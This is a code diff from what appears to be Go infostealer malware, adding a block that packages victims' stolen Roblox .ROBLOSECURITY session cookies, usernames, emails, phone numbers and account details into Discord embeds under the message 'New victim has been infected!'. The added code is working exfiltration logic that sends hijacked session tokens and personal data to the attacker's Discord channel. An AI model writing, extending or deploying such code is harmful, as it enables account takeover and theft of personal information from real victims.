@@ -222,6 +222,52 @@ func SendDiscordNotification() error {
 			},
 		})
 	}
+	for _, account := range robloxResults {
+		embeds = append(embeds, DiscordEmbed{
+			Title:       "Roblox Account Cookie",
+			Description: fmt.Sprintf("`.ROBLOSECURITY` cookie:\n```\n%s\n```", account.Cookie),
+			Fields: []DiscordEmbedField{
+				{
+					Name:   "🆔 User ID",
+					Value:  fmt.Sprintf("`%d`", account.UserID),
+					Inline: true,
+				},
+				{
+					Name:   "👤 Username",
+					Value:  fmt.Sprintf("`%s`", account.Username),
+					Inline: true,
+				},
+				{
+					Name:   "📝 Display Name",
+					Value:  fmt.Sprintf("`%s`", account.DisplayName),
+					Inline: true,
+				},
+				{
+					Name:   "📧 Email",
+					Value:  fmt.Sprintf("`%s`", account.Email),
+					Inline: true,
+				},
+				{
+					Name:   "📱 Phone",
+					Value:  fmt.Sprintf("`%s`", account.Phone),
+					Inline: true,
+				},
+				{
+					Name:   "📅 Created At",
+					Value:  fmt.Sprintf("<t:%d:f>", account.CreatedAt.Unix()),
+					Inline: true,
+				},
+			},
+			Thumbnail: &DiscordEmbedThumbnail{
+				URL: account.AvatarUrl,
+			},
+			URL: fmt.Sprintf("https://www.roblox.com/users/%d/profile", account.UserID),
+			Footer: &DiscordEmbedFooter{
+				Text:    fmt.Sprintf("Found in: %s", account.FoundIn),
+				IconURL: "https://www.roblox.com/favicon.ico",
+			},
+		})
+	}
 
 	message := DiscordMessage{
 		Content: "New victim has been infected!",
